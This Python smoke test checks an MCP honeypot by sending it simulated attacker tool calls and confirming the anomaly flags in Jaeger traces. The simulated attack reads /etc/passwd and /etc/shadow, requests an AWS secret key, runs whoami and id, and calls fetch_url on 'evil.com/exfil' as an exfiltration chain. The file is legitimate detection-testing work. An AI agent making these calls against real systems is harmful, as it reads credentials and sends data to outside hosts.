"""Smoke test for the MCP Honeypot stack.

Requires the full Docker Compose stack to be running::

    docker-compose up --build

Then run::

    python tests/smoke_test.py

Checks health, MCP handshake, tool listing, tool invocation across all four
categories, and Jaeger trace verification for anomaly flags:
credential_probe, exfiltration_chain, privilege_escalation.

Exit 0 on all pass, exit 1 on any failure.
"""

from __future__ import annotations

import json
import sys
import time
from typing import Any

import httpx

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
BASE_URL = "http://localhost:8000"
JAEGER_URL = "http://localhost:16686"
EXPECTED_TOOL_COUNT = 13
JAEGER_POLL_TIMEOUT = 30  # seconds
JAEGER_POLL_INTERVAL = 2  # seconds

results: list[tuple[str, bool, str]] = []


def record(name: str, passed: bool, detail: str = "") -> None:
    tag = "PASS" if passed else "FAIL"
    msg = f"  [{tag}] {name}"
    if detail:
        msg += f" -- {detail}"
    print(msg)
    results.append((name, passed, detail))


# ---------------------------------------------------------------------------
# Helpers: MCP over SSE
# ---------------------------------------------------------------------------

class McpSession:
    """Minimal MCP client that speaks JSON-RPC over the SSE transport.

    The MCP SSE transport works as follows:
    1. GET /sse opens an SSE stream. The first event is an ``endpoint`` event
       whose data is the URL to POST messages to (e.g. ``/messages?session_id=...``).
    2. The client POSTs JSON-RPC requests to that endpoint.
    3. Responses arrive as SSE ``message`` events on the original stream.
    """

    def __init__(self) -> None:
        self._msg_id = 0
        self.endpoint: str | None = None
        self._client = httpx.Client(timeout=30)
        self._sse_response: httpx.Response | None = None
        self._buffer: list[dict[str, Any]] = []
        self._raw_lines: list[str] = []

    def connect(self) -> str:
        """Open the SSE stream and extract the message endpoint URL."""
        self._sse_response = self._client.stream("GET", f"{BASE_URL}/sse").__enter__()
        # Read lines until we get the endpoint event.
        for line in self._sse_response.iter_lines():
            if line.startswith("event:"):
                event_type = line.split(":", 1)[1].strip()
            elif line.startswith("data:"):
                data = line.split(":", 1)[1].strip()
                if event_type == "endpoint":
                    # The endpoint is a relative or absolute path.
                    if data.startswith("/"):
                        self.endpoint = f"{BASE_URL}{data}"
                    else:
                        self.endpoint = data
                    return self.endpoint
        raise RuntimeError("Never received endpoint event from /sse")

    def send(self, method: str, params: dict[str, Any] | None = None) -> dict[str, Any]:
        """Send a JSON-RPC request and return the response."""
        if not self.endpoint:
            raise RuntimeError("Not connected -- call connect() first")

        self._msg_id += 1
        payload: dict[str, Any] = {
            "jsonrpc": "2.0",
            "id": self._msg_id,
            "method": method,
        }
        if params is not None:
            payload["params"] = params

        # POST the request to the message endpoint.
        post_resp = self._client.post(
            self.endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
        )
        if post_resp.status_code not in (200, 202):
            raise RuntimeError(
                f"POST {self.endpoint} returned {post_resp.status_code}: {post_resp.text}"
            )

        # Read SSE events from the stream until we get our response.
        assert self._sse_response is not None
        current_event = ""
        for line in self._sse_response.iter_lines():
            if line.startswith("event:"):
                current_event = line.split(":", 1)[1].strip()
            elif line.startswith("data:") and current_event == "message":
                data = line.split(":", 1)[1].strip()
                try:
                    msg = json.loads(data)
                except json.JSONDecodeError:
                    continue
                if isinstance(msg, dict) and msg.get("id") == self._msg_id:
                    return msg
        raise RuntimeError(f"No response received for request id={self._msg_id}")

    def close(self) -> None:
        if self._sse_response is not None:
            self._sse_response.close()
        self._client.close()


# ---------------------------------------------------------------------------
# Helpers: Jaeger
# ---------------------------------------------------------------------------

def poll_jaeger_for_flag(flag: str, timeout: float = JAEGER_POLL_TIMEOUT) -> bool:
    """Poll Jaeger API until a span with the given anomaly flag is found."""
    deadline = time.monotonic() + timeout
    while time.monotonic() < deadline:
        try:
            resp = httpx.get(
                f"{JAEGER_URL}/api/traces",
                params={"service": "mcp-honeypot", "limit": 50},
                timeout=10,
            )
            if resp.status_code == 200:
                data = resp.json().get("data", [])
                for trace in data:
                    for span in trace.get("spans", []):
                        for tag in span.get("tags", []):
                            if tag.get("key") == "anomaly.flags" and flag in str(
                                tag.get("value", "")
                            ):
                                return True
        except Exception:
            pass
        time.sleep(JAEGER_POLL_INTERVAL)
    return False


# ---------------------------------------------------------------------------
# Test steps
# ---------------------------------------------------------------------------

def test_healthz() -> None:
    """T1: Health check returns 200."""
    try:
        resp = httpx.get(f"{BASE_URL}/healthz", timeout=5)
        record("healthz", resp.status_code == 200, f"status={resp.status_code}")
    except Exception as exc:
        record("healthz", False, str(exc))


def test_mcp_session() -> McpSession | None:
    """T2-T5: Connect, initialize, list tools, call one tool per category.

    Returns the session so later tests can reuse it for chain detection.
    """
    session = McpSession()

    # T2: Connect via SSE
    try:
        endpoint = session.connect()
        record("sse_connect", True, f"endpoint={endpoint}")
    except Exception as exc:
        record("sse_connect", False, str(exc))
        return None

    # T3: MCP initialize handshake
    try:
        init_resp = session.send("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "smoke-test", "version": "1.0"},
        })
        has_result = "result" in init_resp
        record("mcp_initialize", has_result, json.dumps(init_resp.get("result", {}))[:200])

        # Send initialized notification (no id, no response expected -- but we
        # still need to POST it).  We send it as a notification via a direct POST.
        if session.endpoint:
            httpx.post(
                session.endpoint,
                json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                headers={"Content-Type": "application/json"},
                timeout=5,
            )
    except Exception as exc:
        record("mcp_initialize", False, str(exc))
        return session

    # T4: tools/list
    try:
        tools_resp = session.send("tools/list", {})
        tools = tools_resp.get("result", {}).get("tools", [])
        count = len(tools)
        passed = count == EXPECTED_TOOL_COUNT
        record(
            "tools_list",
            passed,
            f"got {count} tools, expected {EXPECTED_TOOL_COUNT}",
        )
    except Exception as exc:
        record("tools_list", False, str(exc))

    # T5: Call one tool from each category
    tool_calls = [
        ("filesystem", "read_file", {"path": "/etc/passwd"}),
        ("web", "fetch_url", {"url": "http://example.com"}),
        ("exec", "run_command", {"command": "whoami"}),
        ("secrets", "get_env_var", {"name": "AWS_SECRET_ACCESS_KEY"}),
    ]
    for category, tool_name, params in tool_calls:
        try:
            resp = session.send("tools/call", {"name": tool_name, "arguments": params})
            has_result = "result" in resp
            preview = json.dumps(resp.get("result", {}))[:120]
            record(f"call_{category}_{tool_name}", has_result, preview)
        except Exception as exc:
            record(f"call_{category}_{tool_name}", False, str(exc))

    return session


def test_credential_probe_flag() -> None:
    """T6: Verify credential_probe flag appears in Jaeger traces.

    The get_env_var call with AWS_SECRET_ACCESS_KEY should have triggered it.
    """
    found = poll_jaeger_for_flag("credential_probe")
    record("jaeger_credential_probe", found, "polled Jaeger API")


def test_exfiltration_chain(session: McpSession | None) -> None:
    """T7: read_file then fetch_url in same session -> exfiltration_chain."""
    if session is None:
        record("exfiltration_chain", False, "no session available")
        return

    try:
        session.send("tools/call", {
            "name": "read_file",
            "arguments": {"path": "/etc/shadow"},
        })
        session.send("tools/call", {
            "name": "fetch_url",
            "arguments": {"url": "http://evil.com/exfil"},
        })
    except Exception as exc:
        record("exfiltration_chain_calls", False, str(exc))
        return

    found = poll_jaeger_for_flag("exfiltration_chain")
    record("jaeger_exfiltration_chain", found, "polled Jaeger API")


def test_privilege_escalation(session: McpSession | None) -> None:
    """T8: filesystem tool then run_command -> privilege_escalation."""
    # We need a fresh session to get a clean category history.
    fresh = McpSession()
    try:
        fresh.connect()
        fresh.send("initialize", {
            "protocolVersion": "2024-11-05",
            "capabilities": {},
            "clientInfo": {"name": "smoke-privesc", "version": "1.0"},
        })
        if fresh.endpoint:
            httpx.post(
                fresh.endpoint,
                json={"jsonrpc": "2.0", "method": "notifications/initialized"},
                headers={"Content-Type": "application/json"},
                timeout=5,
            )

        # First call: filesystem category
        fresh.send("tools/call", {
            "name": "list_directory",
            "arguments": {"path": "/"},
        })
        # Second call: exec category -- should trigger privilege_escalation
        fresh.send("tools/call", {
            "name": "run_command",
            "arguments": {"command": "id"},
        })
    except Exception as exc:
        record("privilege_escalation_calls", False, str(exc))
        fresh.close()
        return

    found = poll_jaeger_for_flag("privilege_escalation")
    record("jaeger_privilege_escalation", found, "polled Jaeger API")
    fresh.close()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main() -> None:
    print("=" * 60)
    print("MCP Honeypot Smoke Test")
    print("=" * 60)
    print()

    # T1: Health check
    test_healthz()

    # T2-T5: MCP session + tool calls
    session = test_mcp_session()

    # T6: Jaeger credential_probe
    test_credential_probe_flag()

    # T7: exfiltration_chain
    test_exfiltration_chain(session)

    # T8: privilege_escalation
    test_privilege_escalation(session)

    # Clean up
    if session is not None:
        session.close()

    # Summary
    print()
    print("=" * 60)
    total = len(results)
    passed = sum(1 for _, ok, _ in results if ok)
    failed = total - passed
    print(f"Results: {passed}/{total} passed, {failed} failed")
    print("=" * 60)

    if failed > 0:
        print("\nFailed checks:")
        for name, ok, detail in results:
            if not ok:
                print(f"  - {name}: {detail}")
        sys.exit(1)
    else:
        print("\nAll checks passed.")
        sys.exit(0)


if __name__ == "__main__":
    main()
